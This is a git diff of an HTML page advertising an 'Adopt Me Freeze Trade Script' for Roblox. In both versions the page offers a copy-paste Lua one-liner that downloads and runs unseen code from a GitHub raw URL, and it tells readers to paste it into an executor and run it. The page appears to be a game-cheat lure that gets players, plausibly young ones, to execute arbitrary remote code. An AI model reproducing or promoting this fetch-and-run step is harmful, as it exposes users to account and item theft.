@@ -4,18 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adopt Me Freeze Trade Script</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
         <h1>Adopt Me Freeze Trade Script</h1>
-        <textarea id="script-box" readonly>loadstring(game:HttpGet("https://raw.githubusercontent.com/jaxcodesx/jaxscriptadoptme/main/amscript", true))()</textarea>
-        <button onclick="copyScript()">📜 COPY SCRIPT</button>
-        <p id="copy-message" style="display:none; color: green;">✅ Script Copied! Paste & run in executor</p>
-        <p>Note: Works both on phone and PC executors. Go in-game, paste in executor, and run it. If it doesn't work, DM @kayplays.adoptme on TikTok.</p>
-        <div class="social">
-            <img src="snapchat.png" alt="Snapchat Logo" class="snapchat-logo">
-            <span>- your_snapchat_username</span>
+        <textarea readonly id="scriptBox">loadstring(game:HttpGet("https://raw.githubusercontent.com/jaxcodesx/jaxscriptadoptme/main/amscript", true))()</textarea>
+        <button id="copyBtn">📜 COPY SCRIPT</button>
+        <p class="note">Note: Works both on phone and PC executors. Go in-game and paste in executor and run it and wait. If it doesn’t work DM @kayplays.adoptme on TikTok.</p>
+        
+        <!-- Snapchat Section -->
+        <div class="snapchat">
+            <img src="snapchat.png" alt="Snapchat Logo">
+            <span>YourUsernameHere</span>
         </div>
     </div>
     <script src="script.js"></script>
